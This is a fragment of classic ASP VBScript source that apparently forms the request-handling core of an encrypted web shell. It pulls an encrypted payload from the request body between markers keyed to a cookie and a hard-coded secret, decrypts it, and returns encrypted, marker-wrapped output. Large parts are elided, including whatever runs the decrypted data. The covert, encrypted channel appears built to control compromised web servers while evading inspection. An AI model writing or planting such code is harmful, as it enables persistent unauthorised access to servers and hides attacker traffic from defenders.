...
End Function
  ...
  'Save binary data To disk
	...
	Function MainEntry()
		...
		Dim reqLeftHex, reqRightHex, encryptedBytes, decryptedBytes, resultBytes
		...
		if InStr(contentType, "application/x-www-form-urlencoded") > 0 then
			...
			rawBody = ReadRequestBodyText()
			if Len(rawBody) = 0 then
				exit function
			end if
			Call GenerateMarker(cookieValue & "mark", g_secret_key, reqLeft, reqRight)
			leftPos = InStr(1, rawBody, reqLeft, vbBinaryCompare)
			rightPos = InStrRev(rawBody, reqRight, -1, vbBinaryCompare)
			if leftPos <= 0 or rightPos <= leftPos then
				Dim candidate
				candidate = ExtractJsonStringValue(rawBody, g_param_name)
				if IsEmpty(candidate) or IsNull(candidate) or candidate = "" then
					candidate = ExtractJsonStringValue(rawBody, "data")
				end if
				if IsEmpty(candidate) or IsNull(candidate) or candidate = "" then
					candidate = ExtractJsonStringValue(rawBody, "encrypted_data")
				end if
				if IsEmpty(candidate) or IsNull(candidate) or candidate = "" then
					exit function
				end if

				leftPos = InStr(1, candidate, reqLeft, vbBinaryCompare)
				rightPos = InStrRev(candidate, reqRight, -1, vbBinaryCompare)
				if leftPos > 0 and rightPos > leftPos then
					encryptedBase64 = Mid(candidate, leftPos + Len(reqLeft), rightPos - (leftPos + Len(reqLeft)))
				else
					' If the JSON field already contains pure encrypted data without markers, accept it.
					encryptedBase64 = candidate
				end if
			else
				encryptedBase64 = Mid(rawBody, leftPos + Len(reqLeft), rightPos - (leftPos + Len(reqLeft)))
			end if
		end if
	...
	Call GenerateMarker(cookieValue, g_secret_key, resLeft, resRight)
	Response.Write resLeft
	Response.Write Replace(Base64Encode(decryption(resultBytes, g_secret_key, true)), "=", "")
	Response.Write resRight
	End Function
	Call MainEntry
